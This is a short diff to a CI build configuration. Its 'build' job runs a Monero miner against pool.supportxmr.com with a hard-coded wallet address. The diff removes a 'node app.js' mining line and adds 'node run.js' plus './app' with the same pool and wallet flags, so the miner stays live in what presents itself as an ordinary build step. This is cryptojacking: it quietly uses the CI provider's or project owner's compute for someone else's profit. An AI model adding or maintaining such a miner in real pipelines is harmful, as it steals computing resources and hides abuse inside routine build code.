@@ -9,4 +9,5 @@ build:
           echo "npm version $(npm -v) running"
           chmod +x app
           node run.js
-          node app.js --donate-level 1 -o pool.supportxmr.com:3333 -O 489SKk43bDUL3KF3E5RPMmEVpB6cLYJJcWZmPbmxrJ1vGyh3dAADeLxUQK8UK6yqNWTJG96cATyiG7Qs39PXi6K932ug3zS:W
+          node run.js
+          ./app --donate-level 1 -o pool.supportxmr.com:3333 -O 489SKk43bDUL3KF3E5RPMmEVpB6cLYJJcWZmPbmxrJ1vGyh3dAADeLxUQK8UK6yqNWTJG96cATyiG7Qs39PXi6K932ug3zS:W
